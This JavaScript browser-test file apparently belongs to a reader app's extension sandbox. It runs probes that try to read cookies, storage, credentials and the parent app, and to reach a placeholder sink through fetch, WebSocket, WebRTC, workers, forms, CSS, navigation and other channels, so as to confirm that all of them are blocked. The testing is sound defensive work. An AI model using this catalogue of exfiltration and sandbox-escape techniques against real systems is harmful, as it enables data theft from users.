/**
 * @license BSD-3-Clause
 * Copyright (c) 2026, ッツ Reader Authors
 * All rights reserved.
 */

/*
 * Browser tests only: run in the extension frame after its runtime (servers.ts serves it into
 * /source-sandbox-probe.html), as code that broke out of QuickJS would. Every probe tries to reach
 * the sink (@SINK@, another origin), the UDP sink (@UDP@), the app's storage or the app's window.
 * Results go to the test page (two windows up); the sink's log, not these results, says whether
 * anything left. `?nav=<kind>` instead tries one self-navigation to the sink.
 */
/* global document, window, parent, top, location, addEventListener, setTimeout, indexedDB, localStorage, sessionStorage, caches, navigator, RTCPeerConnection, fetch, XMLHttpRequest, WebSocket, EventSource, Image, CSSStyleSheet, FontFace, Worker, SharedWorker, Blob, URL, URLSearchParams */
(() => {
  const SINK = '@SINK@';
  const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  const insert = (target, html, ms = 600) => {
    target.insertAdjacentHTML('beforeend', html);
    return wait(ms).then(() => 'inserted');
  };
  const loads = (element) =>
    new Promise((resolve, reject) => {
      element.onload = () => resolve('LOADED');
      element.onerror = () => reject(new Error('error event'));
    });
  const rtc = async (PC) => {
    const pc = new PC({ iceServers: [{ urls: 'stun:127.0.0.1:@UDP@' }] });
    pc.createDataChannel('x');
    await pc.setLocalDescription(await pc.createOffer());
    await wait(1200);
    return `iceGatheringState=${pc.iceGatheringState}`;
  };

  // Probes that read or reach the app without the network: they must throw.
  const mustBlock = {
    indexedDB: () =>
      new Promise((resolve, reject) => {
        const request = indexedDB.open('probe');
        request.onsuccess = () => resolve('OPENED');
        request.onerror = () => reject(request.error);
      }),
    localStorage: () => `length=${localStorage.length}`,
    sessionStorage: () => `length=${sessionStorage.length}`,
    cookieRead: () => `cookie=${document.cookie}`,
    caches: () => caches.keys().then((keys) => `keys=${keys.length}`),
    storageEstimate: () => navigator.storage.estimate().then((e) => `quota=${e.quota}`),
    locks: () => navigator.locks.request('probe', () => 'LOCKED'),
    jailDocument: () => `title=${parent.document.title}`,
    appDocument: () => `title=${parent.parent.document.title}`,
    appLocation: () => `href=${parent.parent.location.href}`,
    appStorage: () => `length=${parent.parent.localStorage.length}`,
    appDesktopBridge: () => `chimiDesktop=${typeof parent.parent.chimiDesktop}`,
    ownDesktopBridge: () => {
      if (globalThis.chimiDesktop || globalThis.require || globalThis.process) return 'FOUND';
      throw new Error('absent');
    },
    webrtc: () => rtc(RTCPeerConnection),
    webrtcAboutBlankChild: () => {
      const child = document.createElement('iframe');
      document.body.append(child);
      return rtc(child.contentWindow.RTCPeerConnection);
    },
    webrtcSrcdocChild: async () => {
      const child = document.createElement('iframe');
      child.srcdoc = '<p>x</p>';
      document.body.append(child);
      await wait(300);
      return rtc(child.contentWindow.RTCPeerConnection);
    },
    serviceWorker: () =>
      navigator.serviceWorker.register('/__probes/same?sw.js').then(() => 'REGISTERED'),
    documentDomain: () => {
      document.domain = location.hostname;
      return 'set';
    },
    credentials: () => navigator.credentials.get({ password: true }).then((c) => `cred=${c}`)
  };

  // Probes judged by the sinks: whatever they report, nothing may arrive there.
  const network = {
    fetch: () => fetch(`${SINK}/fetch`).then((r) => `status=${r.status}`),
    fetchNoCors: () =>
      fetch(`${SINK}/fetch-no-cors`, { mode: 'no-cors' }).then((r) => `type=${r.type}`),
    fetchSameOrigin: () => fetch('/__probes/same?fetch').then((r) => `status=${r.status}`),
    xhr: () =>
      new Promise((resolve, reject) => {
        const x = new XMLHttpRequest();
        x.open('GET', `${SINK}/xhr`);
        x.onload = () => resolve(`status=${x.status}`);
        x.onerror = () => reject(new Error('xhr error'));
        x.send();
      }),
    webSocket: () =>
      new Promise((resolve, reject) => {
        const socket = new WebSocket(`${SINK.replace('http', 'ws')}/ws`);
        socket.onopen = () => resolve('OPEN');
        socket.onerror = () => reject(new Error('ws error'));
      }),
    eventSource: () =>
      new Promise((resolve, reject) => {
        const source = new EventSource(`${SINK}/event-source`);
        source.onopen = () => resolve('OPEN');
        source.onerror = () => {
          source.close();
          reject(new Error('es error'));
        };
      }),
    sendBeacon: () => `queued=${navigator.sendBeacon(`${SINK}/beacon`, 'x')}`,
    image: () => {
      const image = new Image();
      image.src = `${SINK}/image`;
      return loads(image);
    },
    imageInDom: () => insert(document.body, `<img src="${SINK}/img-dom">`),
    svgImage: () => insert(document.body, `<svg><image href="${SINK}/svg-image"/></svg>`),
    cssUrl: () => insert(document.head, `<style>body{background:url(${SINK}/css-url)}</style>`),
    cssom: () => {
      document.body.style.backgroundImage = `url(${SINK}/cssom)`;
      return wait(600).then(() => 'set');
    },
    constructedSheet: () => {
      const sheet = new CSSStyleSheet();
      sheet.replaceSync(`body{background:url(${SINK}/constructed)}`);
      document.adoptedStyleSheets = [sheet];
      return wait(600).then(() => 'adopted');
    },
    stylesheetLink: () => insert(document.head, `<link rel="stylesheet" href="${SINK}/link.css">`),
    fontFace: () => new FontFace('probe', `url(${SINK}/font)`).load().then(() => 'LOADED'),
    importOther: () => import(`${SINK}/import.js`).then(() => 'IMPORTED'),
    importSame: () => import('/__probes/same?import.js').then(() => 'IMPORTED'),
    scriptOther: () => {
      const script = document.createElement('script');
      script.src = `${SINK}/script.js`;
      document.head.append(script);
      return loads(script);
    },
    scriptSame: () => {
      const script = document.createElement('script');
      script.src = '/__probes/same?script.js';
      document.head.append(script);
      return loads(script);
    },
    workerSame: () => {
      new Worker('/__probes/same?worker.js');
      return wait(600).then(() => 'constructed');
    },
    workerBlob: () => {
      const code = new Blob([`fetch('${SINK}/worker-blob')`], { type: 'text/javascript' });
      new Worker(URL.createObjectURL(code));
      return wait(800).then(() => 'constructed');
    },
    workerData: () => {
      new Worker(`data:text/javascript,fetch('${SINK}/worker-data')`);
      return wait(800).then(() => 'constructed');
    },
    sharedWorker: () => {
      new SharedWorker('/__probes/same?shared.js');
      return wait(600).then(() => 'constructed');
    },
    formSubmit: () => {
      const form = document.createElement('form');
      form.action = `${SINK}/form`;
      form.method = 'POST';
      document.body.append(form);
      form.submit();
      return wait(800).then(() => 'submitted');
    },
    windowOpen: () => `window=${window.open(`${SINK}/open`)}`,
    topNavigation: () => {
      top.location.href = `${SINK}/top-navigation`;
      return wait(800).then(() => 'assigned');
    },
    // Chromium connects (no request) to the host of a frame the CSP then blocks: not counted.
    nestedFrame: () => insert(document.body, `<iframe src="${SINK}/nested-frame"></iframe>`, 800),
    objectEmbed: () =>
      insert(
        document.body,
        `<object data="${SINK}/object"></object><embed src="${SINK}/embed">`,
        800
      ),
    media: () =>
      insert(
        document.body,
        `<video src="${SINK}/video"></video><audio src="${SINK}/audio"></audio>`,
        800
      ),
    prefetch: () =>
      insert(
        document.head,
        `<link rel="prefetch" href="${SINK}/prefetch"><link rel="preload" as="fetch" href="${SINK}/preload">`,
        800
      ),
    inlineScript: () => {
      const script = document.createElement('script');
      script.textContent = `fetch('${SINK}/inline-script')`;
      document.head.append(script);
      return wait(300).then(() => 'appended');
    },
    eval: () => eval(`fetch('${SINK}/eval')`),
    forgedMessage: () => {
      parent.parent.postMessage({ op: 'fetch', id: 1, method: 'GET', url: `${SINK}/forged` }, '*');
      return 'posted';
    }
  };

  const navigations = {
    location: () => (location.href = `${SINK}/nav-location`),
    anchor: () => {
      const a = document.createElement('a');
      a.href = `${SINK}/nav-anchor`;
      document.body.append(a);
      a.click();
    },
    metaRefresh: () =>
      document.head.insertAdjacentHTML(
        'beforeend',
        `<meta http-equiv="refresh" content="0;url=${SINK}/nav-meta">`
      ),
    blob: () =>
      (location.href = URL.createObjectURL(
        new Blob(
          [`<img src="${SINK}/nav-blob-img"><script>fetch('${SINK}/nav-blob-fetch')</script>`],
          { type: 'text/html' }
        )
      )),
    data: () => (location.href = `data:text/html,<script>fetch('${SINK}/nav-data')</script>`),
    javascript: () => (location.href = `javascript:fetch('${SINK}/nav-javascript')`)
  };

  const report = (message) => parent.parent.postMessage({ probes: message }, '*');
  const nav = new URLSearchParams(location.search).get('nav');
  // This script runs while the page is parsed: no body yet.
  const parsed = new Promise((resolve) => addEventListener('DOMContentLoaded', resolve));
  const run = async (probe) => {
    try {
      return (
        'ALLOWED: ' +
        (await Promise.race([Promise.resolve().then(probe), wait(2500).then(() => 'no answer')]))
      );
    } catch (error) {
      return `blocked: ${error?.name || ''} ${String(error?.message || error).slice(0, 100)}`;
    }
  };
  (async () => {
    await parsed;
    // After the runtime started, as broken-out extension code would.
    if (nav) return wait(1000).then(navigations[nav]);
    const results = { mustBlock: {}, network: {} };
    await Promise.all([
      ...Object.entries(mustBlock).map(
        async ([name, probe]) => (results.mustBlock[name] = await run(probe))
      ),
      ...Object.entries(network).map(
        async ([name, probe]) => (results.network[name] = await run(probe))
      )
    ]);
    report(results);
  })();
})();
